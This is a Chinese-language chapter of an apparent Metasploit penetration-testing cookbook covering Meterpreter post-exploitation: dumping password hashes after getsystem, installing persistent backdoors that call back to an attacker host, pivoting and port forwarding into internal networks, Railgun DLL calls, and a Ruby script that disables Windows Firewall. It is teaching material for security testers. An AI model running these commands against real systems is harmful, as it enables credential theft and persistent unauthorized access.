# 第六章：高级 Meterpreter 脚本

在这一章中，我们将涵盖：

+   传递哈希

+   设置持久连接与后门

+   使用 meterpreter 进行枢纽

+   使用 meterpreter 进行端口转发

+   Meterpreter API 和 mixin

+   Railgun-将 Ruby 转换为武器

+   将 DLL 和函数定义添加到 Railgun

+   构建“Windows 防火墙停用器”meterpreter 脚本

+   分析现有的 meterpreter 脚本

# 介绍

在上一章中，我们学习了一些强大的 meterpreter 命令，这些命令在后期利用中非常有帮助。Meterpreter 通过提供一个非常交互式和有用的命令解释器，为后期利用过程增加了很多灵活性。它不仅简化了任务，而且使其更加强大和全面。

在本章中，我们将通过学习一些高级概念，将 meterpreter 推进一步。到目前为止，我们一直在使用 Metasploit 提供给我们的各种命令和脚本，但在渗透测试过程中，可能会出现需要向 meterpreter 添加自己的脚本的情况。平台的模块化架构使得开发和集成自己的脚本和模块非常容易。

我们将从学习一些高级的 meterpreter 功能开始，比如传递哈希、枢纽、端口转发等等。然后，我们将转向开发我们自己的 meterpreter 脚本。为了完全理解本章，您应该了解基本的 Ruby 概念。即使对 Ruby 语言有基本的了解也可以帮助您构建智能的 meterpreter 脚本。为了方便读者，我将从一些基本的开发概念开始。然后，我们将分析一些现有的 Ruby 代码，看看我们如何可以重用它们或根据我们的需求进行编辑。然后，我们将学习开发我们自己简单的“Windows 防火墙停用器”meterpreter 脚本。

本章将详细增强您对平台的理解。让我们继续前进，开始实践这些技巧。

# 哈希传递

传递哈希或哈希转储是提取 Windows 登录哈希文件的过程。Hashdump meterpreter 脚本从目标机器中提取并转储密码哈希。哈希可以用于破解登录密码，并获得对 LAN 上其他系统的授权访问，以进行未来的渗透测试。

## 准备就绪

在开始烹饪之前，让我们先了解一下 Windows 密码及其存储格式。

当您在 Windows 登录屏幕上输入密码时，它会使用一个加密方案对您的密码进行加密，将您的密码转换成类似于这样的东西：

`7524248b4d2c9a9eadd3b435c51404ee`

这是一个密码哈希。这实际上是在您输入密码时进行检查的内容。它会加密您输入的内容，并将其与存储在注册表和/或 SAM 文件中的内容进行比对。

SAM 文件保存了本地机器上每个帐户或域（如果是域控制器）的用户名和密码哈希。它可以在硬盘驱动器的`%systemroot%system32config`文件夹中找到。

然而，只有在机器运行时，这个文件夹才对包括管理员在内的所有帐户进行了锁定。在操作过程中，唯一可以访问 SAM 文件的帐户是“系统”帐户。因此，您必须记住，在尝试转储哈希时，您需要提升权限。

哈希对您来说可能完全陌生，因为它们是加密文本。Windows 使用**NTLM（NT LAN Manager）**安全协议进行身份验证。它是 LM 协议的后继者，LM 协议用于旧版本的 Windows。

为了解码转储的哈希，我们将需要一个 NTLM/LM 解密器。有不同的工具可用。其中一些使用暴力破解技术（John the riper，pwdump），而另一些使用彩虹表（彩虹破解）。

## 如何做到这一点...

我们将从一个活动的 meterpreter 会话开始。我假设您已经渗透了目标并获得了一个 meterpreter 会话。您可以参考第四章中的配方，*客户端利用和防病毒绕过*，以获取有关入侵 Windows 机器的更多详细信息。脚本的使用简单直接。让我们首先检查目标机器上的权限。我们必须拥有系统权限才能提取哈希。我们将使用`getuid`命令来了解我们当前的权限级别。为了提升我们的权限，我们将使用`getsystem`命令。

```
meterpreter > getuid
Server username: DARKLORD-PC\DARKLORD
meterpreter > getsystem
...got system (via technique 4).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM 
```

## 工作原理...

现在我们在目标上拥有系统权限，所以我们可以继续尝试 hashdump 脚本。

```
meterpreter > run hashdump
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 78e1241e98c23002bc85fd94c146309d...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hashes...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DARKLORD:1000:aad3b435b51404eeaad3b435b51404ee:3dbde697d71690a769204beb12283678::: 
```

您可以看到脚本已成功从 SAM 文件中提取了密码哈希。现在我们可以使用不同的工具来破解这个哈希。一些知名的工具有 John the riper、pwdump、rainbow crack 等。

## 还有更多...

让我们看看除了使用之前讨论的工具之外，解密哈希的另一种方法。

### 在线密码解密

有一个非常流行的网站用于解密 NTLM/LM 哈希[`www.md5decrypter.co.uk/`](http://www.md5decrypter.co.uk/)。它通过将哈希与其庞大的哈希数据库进行匹配来找到密码。这是一种有效且快速破解简单和弱密码的技术。以下截图显示了我们之前转储的哈希的解码结果：

![在线密码解密](img/7423_06_01.jpg)

如您所见，我们的输入哈希已找到匹配项，相应的可读密码为 123。

需要注意的一点是，破解密码完全取决于其强度。相对于复杂密码，较弱的密码会更容易破解。复杂密码将生成在线数据库中不存在的哈希。因此，考虑使用基于彩虹表的破解器。有关此主题的更多信息可以在以下 URL 找到：

[`bernardodamele.blogspot.in/#!http://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html`](http://bernardodamele.blogspot.in/#!http://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html)。

# 建立与后门的持久连接

我们从一个预入侵技术开始这本书，重点是信息收集。然后，我们继续前进到利用阶段，在那里我们学习了不同的方式来妥协目标。然后，我们学习了一些有用的后期利用技术，可以在妥协目标之后实施。现在，在这个配方中，我们将学习**永久利用技术**，在这里我们将尝试与我们的目标建立持久连接，以便我们可以随意连接到它。作为攻击者，或目标机器，不能总是可用，对目标进行后门处理可以有效地建立持久连接。

## 准备工作

Meterpreter 为我们提供了两个脚本，可以执行对目标进行后门处理的任务。它们是 Metsvc 和 Persistence。这两个脚本的工作方式类似。让我们逐一处理这两个脚本。

### 注意

这两个 meterpreter 脚本都在目标系统上创建文件，因此可能会触发防病毒软件的警报。因此建议在运行这些脚本之前关闭防病毒程序。

## 如何做...

Metsvc 脚本通过在目标机器上创建临时文件，如 DLL、后门服务器和服务来运行。该脚本还可以启动匹配的 multi/handler 以自动连接到后门。`-A`参数用于此目的。让我们在我们的 Windows 7 目标机器上运行脚本并分析结果。

```
meterpreter > run metsvc -h
OPTIONS:
-A Automatically start a matching multi/handler to connect to the service
-h This help menu
-r Uninstall an existing Meterpreter service (files must be deleted manually)
meterpreter > run metsvc -A
[*] Creating a meterpreter service on port 31337
[*] Creating a temporary installation directory C:\Users\DARKLORD\AppData\Local\Temp\ygLFhIFX...
[*] >> Uploading metsrv.dll...
[*] >> Uploading metsvc-server.exe...
[*] >> Uploading metsvc.exe...
[*] Starting the service...
* Installing service metsvc
* Starting service
Service metsvc successfully installed. 
```

一旦后门文件成功上传，它将自动连接到端口 31337 上的 multi/handler。使用这个后门，我们可以随意连接到目标机器。

另一个有用的后门脚本是持久性脚本。它的工作方式类似于 Metscv，但它具有一些额外的功能，比如定期连接回目标，系统启动时连接回来，自动运行等等。让我们看看我们可以使用的不同选项。

```
meterpreter > run persistence -h
Meterpreter Script for creating a persistent backdoor on a target host.
OPTIONS:
-A Automatically start a matching multi/handler to..
-L <opt> Location in target host where to write payload to..
-P <opt> Payload to use, default is
-S Automatically start the agent on boot as a service
-T <opt> Alternate executable template to use
-U Automatically start the agent when the User logs on
-X Automatically start the agent when the system boots
-h This help menu
-i <opt> The interval in seconds between each connection
-p <opt> The port on the remote host where Metasploit..
-r <opt> The IP of the system running Metasploit listening.. 
```

如您所见，它与 Metsvc 相比有一些额外的选项。让我们执行脚本，并根据我们的需求传递不同的参数。

```
meterpreter > run persistence -A -S -U -i 60 -p 4321 -r 192.168.56.101
[*] Running Persistance Script
[*] Resource file for cleanup created at /root/.msf4/logs/persistence/DARKLORD-PC_20111227.0307/DARKLORD-PC_20111227.0307.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4321
[*] Persistent agent script is 610795 bytes long
[+] Persistent Script written to C:\Users\DARKLORD\AppData\Local\Temp\LHGtjzB.vbs
[*] Starting connection handler at port 4321 for windows/meterpreter/reverse_tcp
[+] Multi/Handler started!
[*] Executing script C:\Users\DARKLORD\AppData\Local\Temp\LHGtjzB.vbs
[+] Agent executed with PID 5712
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\DBDalcOoYlqJSi
[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\DBDalcOoYlqJSi
[*] Installing as service..
[*] Creating service cpvPbOfXj 
```

## 它是如何工作的...

注意脚本传递的不同参数。`-A` 参数会在攻击机器上自动启动监听器。`-S` 操作符设置后门在每次 Windows 启动时加载。`-U` 操作符在用户登录系统时执行后门。`-i` 操作符设置后门尝试连接回代理处理程序的间隔。`-p` 是端口号，`-r` 是目标机器的 IP 地址。脚本执行的输出还包含一些有用的信息。脚本已经创建了一个资源文件用于清理，以便在使用后删除后门。脚本已经在目标机器的`temp`文件夹中创建了一个 vbs 文件。它还创建了注册表条目，以便在每次 Windows 启动时自动加载后门。

我们为后门设置了 60 秒的间隔，以便连接回代理处理程序。在脚本成功执行后，您将看到在 60 秒的间隔内，meterpreter 会自动在目标机器上打开一个会话。

这个快速演示解释了我们如何与目标机器建立持久连接。您可以尝试使用这两个脚本进行不同的场景，并分析其工作原理。在下一个示例中，我们将专注于另一个有趣的概念，称为转向。

# 使用 meterpreter 进行转向

到目前为止，我们已经涵盖了大部分主要的 meterpreter 命令和脚本。您一定已经注意到了在后期利用阶段，meterpreter 可以有多么强大。在这个示例中，我们将讨论一个最酷的，也是我最喜欢的概念之一，称为转向。让我们从理解转向的含义开始，为什么需要它，最后 Metasploit 如何在转向中有用。

## 准备工作

在开始使用这个示例之前，让我们首先详细了解转向。转向是指渗透测试人员使用 compromise 的系统来攻击同一网络上的其他系统的方法。这是一个多层次的攻击，在这个攻击中，我们可以访问甚至那些仅供本地内部使用的网络区域，比如内部网。考虑下面图中显示的情景。

![准备工作](img/7423_06_02.jpg)

攻击者可以 compromise 与互联网连接的网络的外部节点。然后这些节点与防火墙连接。防火墙后面是主服务器。现在，由于攻击者无法访问服务器，他可以使用节点作为访问的媒介。如果攻击者成功地 compromise 了节点，那么它可以进一步渗透网络，以达到服务器。这是涉及转向的典型情况。图中的红线显示了通过 compromise 的节点在攻击者和服务器之间建立的转向路径。在这个示例中，我们将使用我们在上一章中学到的一些 meterpreter 网络命令。

## 如何做...

让我们看看如何使用 meterpreter 实现先前讨论的情景。

在这个示例中，我们的目标节点是运行在 Windows 7 上并连接到网络的机器。服务器运行在 Windows 2003 上。通过使用客户端浏览器漏洞，节点已经被 compromise，并且我们已经建立了一个活动的 meterpreter 连接。让我们从在目标节点上运行 ipconfig 开始，看看它上面有哪些可用的接口。

```
meterpreter > ipconfig
Interface 1
Hardware MAC: 00:00:00:00:00:00
IP Address: 10.0.2.15
Netmask : 255.255.255.0
VirtualBox Host-Only Ethernet Adapter
Hardware MAC: 08:00:27:00:8c:6c
IP Address : 192.168.56.1
Netmask : 255.255.255.0 
```

正如你所看到的，目标节点有两个接口。一个是连接到互联网的 192.168.56.1，另一个是内部网络的 IP 接口 10.0.2.15。我们下一个目标将是找出这个本地网络中还有哪些其他系统。为此，我们将使用一个名为`arp_scanner`的 meterpreter 脚本。这个脚本将在内部网络上执行 ARP 扫描，以找出其他可用的系统。

```
meterpreter > run arp_scanner -r 10.0.2.1/24
[*] ARP Scanning 10.0.2.1/24
[*] IP: 10.0.2.7 MAC 8:26:18:41:fb:33
[*] IP: 10.0.2.9 MAC 41:41:41:41:41:41 
```

所以脚本成功地发现了网络上两个可用的 IP 地址。让我们选择第一个 IP 地址并对其进行枢纽转发。

## 工作原理...

为了访问 IP 为 10.0.2.7 的系统（即服务器），我们将不得不通过目标节点 10.0.2.15 路由所有数据包。

为此，我们将使用一个名为`route`的命令。我们在之前的章节中也学习过这个命令。要使用这个命令，我们将把当前的 meterpreter 会话放到后台。

```
meterpreter > background
msf exploit(handler) > route add 10.0.2.15 255.255.255.0 1
[*] Route added
msf exploit(handler) > route print
Active Routing Table
====================
Subnet Netmask Gateway
------ ------- -------
10.0.2.15 255.255.255.0 Session 1 
```

查看路由命令的参数。`add`参数将把详细信息添加到路由表中。然后我们提供了目标节点的 IP 地址和默认网关。最后，我们提供了当前活动的 meterpreter 会话 ID（即 1）。`route print`命令显示了表，你可以清楚地看到所有通过这个网络发送的流量现在都将通过 meterpreter 会话 1。

现在你可以快速对 IP 地址 10.0.2.7 进行端口扫描，这个地址以前对我们来说是不可达的，但现在我们已经通过目标节点路由了我们的数据包，所以我们可以轻松地找出开放的端口和服务。一旦你发现它正在运行 Windows 2003 服务器，你就可以继续使用`exploit/windows/smb/ms08_067_netapi`或任何其他基于操作系统的漏洞来攻击服务器或访问其服务。

# 使用 meterpreter 进行端口转发

讨论枢纽转发时，没有谈论端口转发是不完整的。在这个教程中，我们将继续从之前的枢纽转发教程中，看看如何将数据和请求从攻击机器通过目标节点转发到内部网络服务器。这里需要注意的一点是，我们可以使用端口转发来访问内部服务器的各种服务，但如果我们必须利用服务器，那么我们将不得不使用在之前的教程中讨论的完整概念。

## 准备工作

我们将从之前的教程中讨论的相同场景开始。我们已经攻破了目标节点，这是一个 Windows 7 机器，并且我们已经添加了路由信息，以便通过 meterpreter 会话转发发送到网络上的所有数据包。让我们来看一下路由表。

```
msf exploit(handler) > route print
Active Routing Table
====================
Subnet Netmask Gateway
------ ------- -------
10.0.2.15 255.255.255.0 Session 1 
```

所以我们的表已经准备好了。现在我们将设置端口转发，以便我们的请求通过中继到达内部服务器。

## 如何做...

假设内部服务器在端口 80 上运行 Web 服务，我们想通过端口转发访问它。现在，为了做到这一点，我们将使用`portfwd`命令。让我们检查一下这个命令的可用选项，然后传递相关的值。

```
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]
OPTIONS:
-L <opt> The local host to listen on (optional).
-h Help banner.
-l <opt> The local port to listen on.
-p <opt> The remote port to connect to.
-r <opt> The remote host to connect to.
meterpreter > portfwd add -l 4321 -p 80 -r 10.0.2.7
[*] Local TCP relay created: 0.0.0.0:4321 <-> 10.0.2.7:80 
```

成功执行命令表明，攻击者和内部服务器之间已经建立了本地 TCP 中继。攻击者机器上的监听端口是 4321，要访问的内部服务器上的服务端口是 80。

由于我们已经设置了路由信息，整个中继过程是透明的。现在，如果我们尝试通过浏览器使用 URL `http://10.0.2.7:80`来访问内部服务器，那么我们将被引导到内部网络的 http 内部服务。

在需要运行 Metasploit 不提供的命令或应用程序的情况下，端口转发可能非常方便。在这种情况下，您可以使用端口转发来简化您的任务。

这是端口转发的一个小演示。在下一个教程中，我们将开始使用 Ruby 编程来开发我们自己的 meterpreter 脚本。

## 工作原理...

端口转发的工作原理很简单，即在不安全的位置或网络提供受限服务的概念。可以使用经过身份验证或可靠的系统/软件在不安全和安全网络之间建立通信媒介。在第一章中，我们已经讨论了端口转发的简单用法，其中我们讨论了在虚拟机上设置 Metasploit 并使用 PuTTY 将其连接到主机操作系统。

![工作原理...](img/7423_06_03.jpg)

前面的图表演示了端口转发的过程，以一个简单的例子为例。外部来源想要访问运行在 6667 端口上的 IRC 服务器，但防火墙配置为阻止对 6667 端口的外部访问（图表中的红线）。因此，外部来源连接到运行在 22 端口上的 SSH 服务器（例如 PuTTY），该端口未被防火墙阻止。这将为外部来源提供一个防火墙绕过，现在它可以通过从 22 端口到 6667 端口的端口转发访问 IRC 服务器。因此，端口转发创建了一个访问隧道（图表中的蓝线）。

# Meterpreter API 和混合内容

在过去的一个半章中，我们已经广泛学习了如何将 meterpreter 作为潜在的后渗透工具。您可能已经意识到了 meterpreter 在使我们的渗透任务更轻松、更快速方面的重要作用。现在，从这个示例开始，我们将继续讨论与 meterpreter 相关的一些高级概念。我们将深入了解 Metasploit 的核心，了解 meterpreter 脚本的功能以及如何构建我们自己的脚本。

从渗透测试人员的角度来看，了解如何实现我们自己的脚本技术以满足场景的需求非常重要。可能会出现需要执行任务的情况，meterpreter 可能无法解决您的任务。因此，您不能坐视不管。这就是我们开发自己的脚本和模块变得方便的地方。让我们从这个示例开始。在这个示例中，我们将讨论 meterpreter API 和一些重要的混合内容，然后在后续的示例中，我们将编写我们自己的 meterpreter 脚本。

## 准备工作

Meterpreter API 对程序员来说可能会有所帮助，他们可以在渗透测试期间实现自己的脚本。由于整个 Metasploit 框架都是用 Ruby 语言构建的，因此 Ruby 编程经验可以增强您在 Metasploit 中的渗透经验。在接下来的几个示例中，我们将处理 Ruby 脚本，因此需要一些 Ruby 编程经验。即使您对 Ruby 和其他脚本语言有基本的了解，那么您也会很容易理解这些概念。

### 提示

**下载示例代码**

您可以从您在[`www.packtpub.com`](http://www.packtpub.com)账户中购买的所有 Packt 图书中下载示例代码文件。如果您在其他地方购买了这本书，您可以访问[`www.packtpub.com/support`](http://www.packtpub.com/support)并注册，文件将直接通过电子邮件发送给您。

## 操作方法

让我们从在 meterpreter 中启动交互式 Ruby shell 开始。在这里，我假设我们已经成功利用了目标（Windows 7）并且有一个活动的 meterpreter 会话。

可以使用`irb`命令启动 Ruby shell。

```
meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client 
```

现在我们进入了 Ruby shell，可以执行我们的 Ruby 脚本。让我们从两个数字的基本相加开始。

```
>> 2+2
=> 4 
```

所以我们的 shell 运行正常，可以解释语句。现在让我们执行一个复杂的操作。让我们创建一个哈希表，并在其中存储一些值和键。然后，我们将有条件地删除这些值。脚本如下所示：

```
x = { "a" => 100, "b" => 20 }
x.delete_if { |key, value| value < 25 }
print x.inspect 
```

这个脚本很容易理解。在第一行中，我们创建了键（a 和 b）并为它们分配了值。然后，在下一行中，我们添加了一个条件，删除任何值小于 25 的哈希元素。

让我们来看一些打印 API 调用，这些对我们在编写 meterpreter 脚本时会很有用。

+   `print_line("message")：`此调用将打印输出并在末尾添加回车。

+   `print_status("message")：`此调用在脚本语言中经常使用。此调用将提供回车并打印正在执行的任何内容的状态，以[*]开头。

```
>> print_status("HackingAlert")
[*] HackingAlert
=> nil 
```

+   `print_good("message")：`此调用用于提供任何操作的结果。消息显示为[+]，表示操作成功。

```
>> print_good("HackingAlert")
[+] HackingAlert
=> nil 
```

+   `print_error("message")：`此调用用于显示在脚本执行过程中可能发生的错误消息。消息显示为[-]，表示错误消息的开始。

```
>> print_error("HackingAlert")
[-] HackingAlert
=> nil 
```

我讨论这些不同的打印调用的原因是它们在编写 meterpreter 脚本时在相应的情况下被广泛使用。您可以在`/opt/framework3/msf3/documentation`中找到与 meterpreter API 相关的文档。阅读它们以便清晰和详细地理解。您还可以参考`/opt/framework3/msf3/lib/rex/post/meterpreter`，在那里您可以找到许多与 meterpreter API 相关的脚本。

这些脚本中包含各种 meterpreter 核心、桌面交互、特权操作以及许多其他命令。查看这些脚本，以便熟悉 meterpreter 在受损系统中的操作方式。

### **Meterpreter mixins**

Meterpreter mixins 是 Metasploit 特定的 irb 调用。这些调用在 irb 中不可用，但它们可以用来表示编写 meterpreter 脚本时最常见的任务。它们可以简化我们编写特定 meterpreter 脚本的任务。让我们看一些有用的 mixins：

+   `cmd_exec(cmd)：`以隐藏和通道化的方式执行给定命令。命令的输出以多行字符串形式提供。

+   `eventlog_clear(evt = "")：`清除给定的事件日志或所有事件日志（如果未给出）。返回已清除的事件日志数组。

+   `eventlog_list()：`枚举事件日志并返回包含事件日志名称的数组。

+   `file_local_write(file2wrt, data2wrt)：`将给定字符串写入指定文件。

+   `is_admin?()：`标识用户是否为管理员。如果用户是管理员，则返回 true，否则返回 false。

+   `is_uac_enabled?()：`确定系统上是否启用了用户账户控制（UAC）。

+   `registry_createkey(key)：`创建给定的注册表键并在成功时返回 true。

+   `registry_deleteval(key,valname)：`删除给定键和值名称的注册表值。如果成功，则返回 true。

+   `registry_delkey(key)：`删除给定的注册表键并在成功时返回 true。

+   `registry_enumkeys(key)：`枚举给定注册表键的子键并返回子键数组。

+   `registry_enumvals(key)：`枚举给定注册表键的值并返回值名称数组。

+   `registry_getvaldata(key,valname)：`返回给定注册表键和其值的数据。

+   `service_create(name, display_name, executable_on_host,startup=2)：`用于创建运行自己进程的服务。参数为服务名称（字符串）、显示名称（字符串）、在主机上执行的可执行文件的路径（字符串）和启动类型（整数：2 为自动，3 为手动，4 为禁用）。

+   `service_delete(name)：`用于通过删除注册表中的键来删除服务。

+   `service_info(name)：`获取 Windows 服务信息。信息以哈希形式返回，包括显示名称、启动模式和服务执行的命令。服务名称区分大小写。哈希键为 Name、Start、Command 和 Credentials。

+   `service_list()：`列出所有存在的 Windows 服务。返回包含服务名称的数组。

+   `service_start(name):` 该函数用于服务启动。如果服务已启动，则返回 0，如果服务已经启动，则返回 1，如果服务已禁用，则返回 2。

+   `service_stop(name):` 该函数用于停止服务。如果服务成功停止，则返回 0，如果服务已经停止或禁用，则返回 1，如果服务无法停止，则返回 2。

这是对一些重要的 meterpreter 混合的快速参考。使用这些混合可以减少我们脚本的复杂性。我们将在接下来的几个教程中了解它们的用法，我们将创建和分析 meterpreter 脚本。

## 工作原理...

meterpreter API 简单地创建了一个可以理解和解释 Ruby 指令的迷你 Ruby 解释器。使用 API 的主要优势是它给了我们灵活性来执行我们自己的操作。我们不能为所有操作都有命令。可能会有需要特定脚本来执行任务的情况。这就是 API 可以派上用场的地方。

# Railgun - 将 Ruby 转化为武器

在上一个教程中，我们看到了使用 meterpreter API 运行 Ruby 脚本。让我们再进一步。假设我们想在受害者机器上进行远程 API 调用，那么最简单的方法是什么？Railgun 是显而易见的答案。它是一个 meterpreter 扩展，允许攻击者直接调用 DLL 函数。通常，它用于调用 Windows API，但我们可以调用受害者机器上的任何 DLL。

## 准备工作

要开始使用 Railgun，我们需要在目标机器上有一个活动的 meterpreter 会话。要启动 Ruby 解释器，我们将使用上一个教程中讨论的`irb`命令。

```
meterpreter>irb
>> 
```

## 如何做...

在我们开始调用 DLL 之前，让我们首先看看要遵循的基本步骤，以便充分利用 Railgun。

1.  识别您希望调用的函数。

1.  在[`msdn.microsoft.com/en-us/library/aa383749(v=vs.85).aspx`](http://msdn.microsoft.com/en-us/library/aa383749(v=vs.85).aspx)上找到该函数。

1.  检查函数所在的库（DLL）（例如，`kernel32.dll`）。

1.  所选的库函数可以被调用为`client.railgun.dll_name.function_name(arg1, arg2, ...)`。

Windows MSDN 库可用于识别在目标机器上调用的有用的 DLL 和函数。让我们调用`shell32.dll`的简单`IsUserAnAdmin`函数并分析输出。

```
>> client.railgun.shell32.IsUserAnAdmin
=> {"GetLastError"=>0, "return"=>false} 
```

正如我们所看到的，该函数返回了`false`值，表明用户不是管理员。让我们提升我们的特权，然后再试一次调用。

```
meterpreter > getsystem
...got system (via technique 4).
meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client
>> client.railgun.shell32.IsUserAnAdmin
=> {"GetLastError"=>0, "return"=>true} 
```

这次函数返回了`true`，表明我们的特权升级成功了，现在我们正在以系统管理员的身份工作。Railgun 为我们提供了灵活性，可以轻松执行那些不以模块形式存在的任务。因此，我们不仅仅局限于框架提供的脚本和模块，事实上，我们可以按需调用。

您可以进一步将此调用扩展为一个带有错误检查的小型 Ruby 脚本：

```
print_status "Running the IsUserAnAdmin function"
status = client.railgun.shell32.IsUserAnAdmin()
if status['return'] == true then
print_status 'You are an administrator'
else
print_error 'You are not an administrator'
end 
```

使用 Railgun 可以是一个非常强大和令人兴奋的体验。您可以练习自己的调用和脚本来分析输出。但是，如果您想要调用的 DLL 或函数不是 Railgun 定义的一部分，那么 Railgun 还提供了灵活性，可以将您自己的函数和 DLL 添加到 Railgun 中。我们将在下一个教程中处理这个问题。

## 工作原理...

Railgun 是一个特定的 Ruby 命令解释器，可以用于对受损目标进行远程 DLL 调用。远程 DLL 调用在渗透测试中是一个重要的过程，因为它让我们对受损目标有了完全特权的系统指令执行权限。

## 还有更多...

Railgun 是一个有趣的工具，可以增强渗透测试的过程。让我们找出更多关于 Railgun 的信息。

### Railgun 定义和文档

Railgun 目前支持十种不同的 Windows API DLL。你可以在以下文件夹中找到它们的定义：`pentest/exploits/framework3/lib/rex/post/meterpreter/extensions/stdapi/railgun/def`

除此之外，你还可以从以下位置阅读 Railgun 文档：

`/opt/framework3/msf3/external/source/meterpreter/source/extensions/stdapi/server/railgun/railgun_manual.pdf`

# 向 Railgun 添加 DLL 和函数定义

在上一个示例中，我们专注于通过 Railgun 调用 Windows API DLL。在这个示例中，我们将专注于向 Railgun 添加我们自己的 DLL 和函数定义。为了做到这一点，我们应该了解 Windows DLL。Railgun 手册可以帮助你快速了解可以在添加函数定义时使用的不同 Windows 常量。

## 如何做...

向 Railgun 添加新的 DLL 定义是一项简单的任务。假设你想添加一个随 Windows 一起提供但在你的 Railgun 中不存在的 DLL，那么你可以在`pentest/exploits/framework3/lib/rex/post/meterpreter/extensions/stdapi/railgun/def`下创建一个 DLL 定义，并将其命名为`def_dllname.rb`。

1.  考虑将 shell32.dll 定义添加到 Railgun 中的示例。我们可以从添加以下代码行开始：

```
module Rex
module Post
module Meterpreter
module Extensions
module Stdapi
module Railgun
module Def
class Def_shell32
def self.create_dll(dll_path = 'shell32')
dll = DLL.new(dll_path, ApiConstants.manager)
......
end
end
end; end; end; end; end; end; end 
```

1.  将这段代码保存为`def_shell32.dll`将会为 shell32.dll 创建一个 Railgun 定义。

1.  下一步是向 DLL 定义中添加函数。如果你看一下 Metasploit 中的`def_shell32.dll`脚本，你会发现`IsUserAnAdmin`函数已经被添加进去了。

```
dll.add_function('IsUserAnAdmin', 'BOOL', []) 
```

该函数简单地返回一个布尔值 True 或 False，取决于条件。同样，我们可以在 shell32.dll 中添加我们自己的函数定义。考虑添加`OleFlushClipboard()`函数的示例。这将清除 Windows 剪贴板上存在的任何数据。

1.  在 shell32.dll 定义中添加以下代码行将达到我们的目的：

```
dll.add_function('OleFlushClipboard' , 'BOOL' , []) 
```

### 它是如何工作的...

为了测试该函数，保存文件并返回到 meterpreter 会话中，检查函数是否成功执行。

```
>> client.railgun.shell32.OleFlushClipboard
=> {"GetLastError"=>0, "return"=>true} 
```

或者，你也可以使用`add_dll`和`add_function`直接将 DLL 和函数添加到 Railgun。以下是一个完整的脚本，它检查 shell32\. dll 和`OleFlushClipboard`函数的可用性，如果它们不存在，则使用`add_dll`和`add_function`调用进行添加。

```
if client.railgun.get_dll('shell32') == nil
print_status "Adding Shell32.dll"
client.railgun.add_dll('shell32','C:\\WINDOWS\\system32\\shell32.dll')
else
print_status "Shell32 already loaded.. skipping"
end
if client.railgun.shell32.functions['OleFlushClipboard'] == nil
print_status "Adding the Flush Clipboard function"
client.railgun.add_function('shell32', 'OleFlushClipboard', 'BOOL', [])
else
print_status "OleFlushClipboard already loaded.. skipping"
end 
```

这是使用 Railgun 作为一个强大工具根据我们的需要调用 Windows API 的一个简短演示。你可以在 MSDN 库中寻找各种有用的 Windows API 调用，并将它们添加到 Railgun 中，增强你的框架的功能。它可以用来调用目标机器上的任何 DLL。在下一个示例中，我们将继续开发我们自己的 meterpreter 脚本。

# 构建一个“Windows 防火墙停用器”meterpreter 脚本

到目前为止，我们已经使用了几个 meterpreter 脚本，比如`killav.rb`和`persistence.rb`。让我们开始讨论开发我们自己的 meterpreter 脚本。编写 Metasploit 中的任何模块都需要 Ruby 知识。你应该对 Ruby 有基本的了解。目前没有足够的文档可以直接学习 meterpreter 脚本编写。最简单和最好的做法是学习 Ruby 语言，同时不断查看各种可用模块的代码。你也可以阅读 Metasploit 开发者指南，了解框架提供的不同库，这些库可以在编写自己的模块时使用。文档可以在[`dev.metasploit.com/redmine/projects/framework/wiki/DeveloperGuide`](http://dev.metasploit.com/redmine/projects/framework/wiki/DeveloperGuide)找到。

我们将在这里开发的脚本是一个 Windows Vista/7 防火墙停用器脚本。它将使用 Windows 命令`netsh`，meterpreter 将通过使用名为`cmd_exec()`的 mixin 在目标机器上执行该命令。

## 准备工作

Meterpreter 脚本在受攻击的客户端上运行，因此您只需专注于通过脚本执行的任务。您不必担心连接或任何其他参数。让我们看看在编写 meterpreter 脚本时应该牢记的一些重要准则

+   **避免全局变量：** 这是在任何框架上编码的一般原则。应避免使用全局变量，因为它们可能会干扰框架变量。只使用实例、局部和常量变量。

+   **使用注释：** 在编写代码时，注释是必不可少的。这可以帮助您跟踪哪个部分负责特定的操作。

+   **包括参数：** 您可能已经注意到在几个示例中，我们如何将参数与脚本一起传递。最基本但有用的参数是`-h`或`help`选项。

+   **打印结果：** 打印操作结果可以证明脚本的执行是成功还是失败。应该广泛使用不同的打印调用，如`print_status, print_error`等，以显示相关信息。

+   **平台验证：** 确保您验证要在其上执行操作的平台。

+   **保持文件约定：** 完成脚本编写后，请将其保存在`/pentest/exploits/framework3/scripts/meterpreter`目录下。遵循框架文件约定可以避免任何冲突。

+   **使用 mixin：** Mixin 是 meterpreter 中的一个重要概念。使用 mixin 可以使我们的脚本看起来更简单、更容易。

在编写 meterpreter 脚本时，您应该牢记这些准则。

让我们打开任何文本编辑器开始编写 Ruby 脚本。如果您正在使用 BackTrack，则可以使用 Gedit 文本编辑器。

## 如何做到...

1.  在文本编辑器中输入以下代码行。在转到解释部分之前，仔细查看脚本，并尝试弄清楚每行的含义。脚本很容易理解。

```
# Author: Abhinav Singh
# Windows Firewall De-Activator
#Option/parameter Parsing
opts = Rex::Parser::Arguments.new(
"-h" => [ false, "Help menu." ]
)
opts.parse(args) { |opt, idx, val|
case opt
when "-h"
print_line "Meterpreter Script for disabling the Default windows Firelwall"
print_line "Let's hope it works"
print_line(opts.usage)
raise Rex::Script::Completed
end
}
# OS validation and command execution
unsupported if client.platform !~ /win32|win64/i
end
begin
print_status("disabling the default firewall")
cmd_exec('cmd /c','netsh advfirewall set AllProfiles state off',5) 
```

一旦您输入了代码，请将其保存为`myscript.rb`，保存在`/pentest/exploits/framework3/scripts/meterpreter`目录下。

